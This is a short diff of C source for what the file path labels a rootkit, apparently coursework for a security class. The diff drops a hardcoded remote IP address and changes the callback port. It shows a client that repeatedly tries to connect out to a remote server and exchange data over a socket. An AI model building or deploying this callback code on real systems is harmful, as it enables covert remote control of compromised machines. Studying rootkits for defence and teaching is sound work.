@@ -5,8 +5,8 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <stdlib.h>
-#define REMOTE_ADDRESS "188.166.177.208"
-#define REMOTE_PORT 2000
+
+#define REMOTE_PORT 2001
 #define POLL_DURATION 10
 #define FILE_LOCATION "/usr/home/comp6447/rootkit/src/bin/test"
 #define DEBUG 1
@@ -17,12 +17,16 @@ void read_and_write(int socket_fd);
 int main(int argc, char** argv)
 {
 
-	if(argc < 2){
-		char * remote_address = REMOTE_ADDRESS;
+	if(argc == 2)
+    {
+        char * remote_address = argv[1];
 	}
-	else{
-		char * remote_address = argv[1];
+	else
+    {
+        printf("ERROR NO REMOTE SUPPLIED\n");
+        exit(1);
 	}
+
 	int sock;
     while( (sock = attempt_connection_to_server()) == -1)
 	{
